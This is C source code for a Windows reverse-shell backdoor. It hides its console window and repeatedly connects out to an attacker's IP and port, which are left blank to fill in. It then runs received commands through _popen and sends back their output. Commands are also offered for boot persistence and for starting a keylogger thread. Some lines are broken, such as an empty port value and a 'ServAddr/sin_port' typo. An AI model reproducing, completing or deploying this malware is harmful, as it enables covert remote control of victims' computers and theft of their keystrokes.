#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
//#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <string.h>
#include <windowsx.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "main.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

void shell()
{
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while(1)
    {
        jump:
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        recv(sock, buffer, 1024, 0);

        if (strncmp("q", buffer, 1) == 0)
        {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            chdir(str_cut(buffer, 3,100));
        }
        else if (strncmp("persist ", buffer, 7) == 0)
        {
            runbootup();
        }
        else if (strncmp("Keylog_start", buffer, 12) == 0)
        {
            HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);
            goto jump;
        }
        else
        {
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container, 1024, fp) != NULL)
            {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int APIENTRY_P WinMain(HINSTANCE hInstance, HISTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr ServAddr;
    unsigned short ServPort;
    char *servIP;

    WSADATA wsaData;
    servIP = ""; /*Put a ip address if you are sure*/
    ServPort = ; /*Put a server port */

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(servIP);
    ServAddr/sin_port = htons(ServPort);

    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
    {
        Sleep(8);
        goto start;
    }

    shell();

}
